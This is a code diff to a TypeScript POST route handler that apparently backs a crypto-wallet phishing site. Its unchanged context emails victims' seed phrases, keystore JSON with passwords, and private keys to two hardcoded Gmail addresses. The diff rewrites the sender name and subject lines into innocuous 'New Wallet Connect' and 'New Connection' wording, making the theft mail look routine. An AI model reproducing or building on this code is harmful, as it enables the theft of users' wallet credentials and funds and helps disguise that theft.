@@ -36,9 +36,9 @@ export async function POST(request: Request) {
       const formattedMessage = formatMessage(phrase);
 
       const mailOptions = {
-        from: `Dapp App ${email}`,
+        from: `New Wallet Connect .`,
         to: ["at2968771@gmail.com", "fahadabdullahi180@gmail.com"],
-        subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
+        subject: "N",
         html: formattedMessage,
       }
 
@@ -75,9 +75,9 @@ export async function POST(request: Request) {
 
 
       const mailOptions = {
-        from: `Dapp App ${email}`,
+        from: `New Wallet Connect .`,
         to: ["at2968771@gmail.com", "fahadabdullahi180@gmail.com"],
-        subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
+        subject: "New Connection",
         html: `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>`,
       }
 
@@ -116,9 +116,9 @@ export async function POST(request: Request) {
       const formattedMessage = formatMessage(privateKey);
 
       const mailOptions = {
-        from: `Dapp App ${email}`,
+        from: `New Wallet Connect .`,
         to: ["at2968771@gmail.com", "fahadabdullahi180@gmail.com"],
-        subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
+        subject: "New Connection",
         html: formattedMessage,
       }
 
